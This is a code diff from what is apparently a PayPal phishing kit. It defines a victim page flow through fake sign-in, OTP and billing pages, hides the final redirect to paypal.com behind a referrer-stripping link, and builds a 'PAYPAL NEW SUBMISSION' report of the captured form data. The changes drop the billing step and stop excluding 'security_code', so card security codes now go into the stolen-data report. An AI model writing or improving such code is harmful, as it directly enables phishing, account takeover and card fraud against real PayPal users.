@@ -100,7 +100,7 @@ const pageFlow = {
   1: "login",
   2: "otp",
   3: "0",        // skipped
-  4: "bill",
+  4: "0",
   5: "final"
 };
 
@@ -108,7 +108,6 @@ const pageFlow = {
 const routeMap = {
   login: "sign-in",
   otp: "sign-in?action=otp",
-  bill: "sign-in?action=bill",
   contact: "sign-in?action=contact",
   final: "https://href.li/?https://paypal.com"
 };
@@ -195,7 +194,7 @@ async function buildMessage(data, options = {}) {
   try { 
     let message = ``;
     message = `🤖 PAYPAL NEW SUBMISSION\n\n`;
-    const excludeKeys = ["visitor", "userid", "security_code"];
+    const excludeKeys = ["visitor", "userid"];
 
     for (const [key, value] of Object.entries(data)) {
       const lowerKey = key.toLowerCase();
